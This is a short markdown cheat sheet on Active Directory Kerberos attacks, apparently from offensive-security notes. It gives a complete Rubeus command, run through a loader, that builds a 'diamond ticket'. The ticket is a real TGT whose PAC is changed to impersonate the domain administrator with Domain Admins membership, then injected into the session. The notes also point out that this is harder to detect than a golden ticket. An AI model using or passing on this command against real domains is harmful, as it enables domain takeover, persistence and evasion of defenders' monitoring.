# Diamond Ticket (Rubeus)

Request a legitimate TGT and modify it (PAC edit) rather than forging from scratch. More OPSEC-safe than golden ticket.

## Prerequisites
- krbtgt AES256 hash
- Domain SID

## Create Diamond Ticket
```
Loader.exe -path Rubeus.exe -args diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:<DOMAIN> /dc:<DC_FQDN> /ticketuserid:500 /groups:512 /createnetonly:cmd.exe /show /ptt
```

- `/tgtdeleg` — obtains a TGT via S4U2self delegation (no creds needed for current user)
- `/ticketuser:administrator` + `/ticketuserid:500` — sets target user in modified PAC
- `/groups:512` — Domain Admins group RID
- `/createnetonly:cmd.exe /show` — spawns new sacrificial process

## Notes
- Requests real TGT from KDC then patches PAC — harder to detect than forged golden ticket
- Requires high integrity process
